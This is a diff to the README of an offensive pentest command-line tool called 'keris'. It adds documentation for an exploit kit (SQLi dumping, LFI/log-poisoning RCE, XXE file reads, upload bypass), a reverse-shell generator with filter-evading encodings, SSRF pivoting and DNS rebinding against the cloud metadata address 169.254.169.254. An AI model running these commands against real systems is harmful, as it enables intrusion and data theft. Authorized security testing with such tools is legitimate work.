@@ -38,7 +38,8 @@ wordlists, credential validation against a live login, credential hunting
   system without permission is illegal in almost every jurisdiction.
 - A red warning banner is printed before every aggressive mode (`--pwn`,
   `--exploit`, `--brute-extended`, `dos --hammer`, `hunt --verify`,
-  `credcheck`). It is a reminder that all risk stays with you.
+  `credcheck`, `exploit`, `shell`, `pivot`, `rebind`). It is a reminder that
+  all risk stays with you.
 - Never use this for cybercrime. Legality and responsibility sit with the
   operator, not the tool.
 
@@ -99,7 +100,7 @@ never expose it publicly.
 
 ## Commands
 
-38 subcommands. The ones you'll reach for most:
+38+ subcommands. The ones you'll reach for most:
 
 | Command | What it does |
 |---|---|
@@ -122,6 +123,10 @@ never expose it publicly.
 | `tui` | Interactive terminal UI with a live progress dashboard |
 | `hunt` | Credential hunting: `.git` dump, `.env`/backup files, cloud secrets |
 | `credcheck` | Prove leaked credentials actually log in (authorized only) |
+| `exploit` | Exploit kit: SQLi data dump, LFI/RFI, upload bypass, XXE, RCE confirm (authorized only) |
+| `shell` | Reverse-shell payload generator (bash/python/powershell + URL/base64 variants) + read-only RCE proof (authorized only) |
+| `pivot` | SOCKS5 proxy pivoting through a confirmed SSRF endpoint (authorized + `--yes` only) |
+| `rebind` | DNS rebinding server to bypass SSRF allowlists (authorized + `--yes` only) |
 | `plugins` / `init` | Your own custom checks; generate an example `keris.json` |
 
 Every full scan includes by default: SQLi, XSS, SSRF, IDOR, rate-limit,
@@ -315,6 +320,72 @@ Detects HTML login forms (auto-fills username/password, preserves CSRF hidden
 fields) with a fallback to HTTP basic auth. Every confirmed credential is
 reported as HIGH so the owner can reset it immediately. Authorized use only —
 this is a live login attempt.
+
+### Exploit kit (`exploit`)
+
+Turns scanner signals into proven exploitation. Every check refuses to run
+without `--authorized`:
+
+```bash
+keris exploit https://example.com --authorized                 # default: sqli,lfi,upload,xxe,rce
+keris exploit https://example.com --authorized --types sqli --endpoint "/search?id=1"
+keris exploit https://example.com --authorized --types xxe --callback https://collab.burp
+keris exploit https://example.com --authorized --types lfi,rfi --callback https://interactsh
+```
+
+- **SQLi** — fingerprints the DB engine (MySQL/PostgreSQL/MSSQL/SQLite/Oracle)
+  via error + boolean probes, counts UNION columns, then dumps db name, version
+  and user through a reflected column.
+- **LFI / path traversal** — `../../etc/passwd` (with 8 encoding bypasses),
+  `php://filter` base64 extraction, and LFI→RCE via log poisoning
+  (`/var/log/apache2/access.log` + injected PHP marker).
+- **RFI** — loads your callback URL into the parameter; confirm the hit in your
+  collaborator (`--callback`).
+- **Upload bypass** — double extensions, null byte, case tricks, MIME swaps,
+  GIF polyglot, `.htaccess`; then verifies the uploaded file actually
+  **executes** (RCE proof).
+- **XXE** — inline file read (`file:///etc/passwd`), PHP-wrapper base64, and
+  blind OOB via external DTD (`--callback`).
+
+### Reverse-shell helper (`shell`)
+
+Generates cross-platform reverse-shell payloads (bash `/dev/tcp`, Python
+socket, PowerShell) with URL/base64 encodings to dodge character filters, plus
+a read-only RCE proof mode (`id`, `uname -a`) that avoids destructive commands:
+
+```bash
+keris shell --lhost YOUR_IP --lport 4444 --authorized
+keris shell https://example.com --endpoint "/cgi?cmd=x" --authorized   # read-only RCE proof
+```
+
+### SOCKS5 pivot (`pivot`)
+
+Turns a confirmed SSRF into a SOCKS5 proxy into the target's internal network
+(HTTP pivoting through the vulnerable parameter — great for reaching internal
+dashboards and admin panels):
+
+```bash
+keris pivot http://host/fetch?url=1 --ssrf-param url --authorized --yes
+# lalu:
+curl --socks5-hostname 127.0.0.1:1080 http://10.0.0.1/admin
+```
+
+Requires both `--authorized` **and** `--yes` (the proxy keeps running until
+Ctrl+C).
+
+### DNS rebinding (`rebind`)
+
+Starts a tiny DNS server that answers the same hostname with a legit IP first
+(to pass server-side allowlist validation) and your target IP on subsequent
+queries — the classic SSRF/SOP bypass:
+
+```bash
+keris rebind --domain rebind.example.com --target-ip 169.254.169.254 --authorized --yes
+# lalu suntikkan http://rebind.example.com/latest/meta-data/ ke parameter SSRF
+```
+
+Also requires `--authorized --yes` (a DNS server on port 53 needs privileges;
+bind to 127.0.0.1 for local labs).
 
 ### SSRF detection & exploitation (`--ssrf` / `--ssrf-exploit`)
 
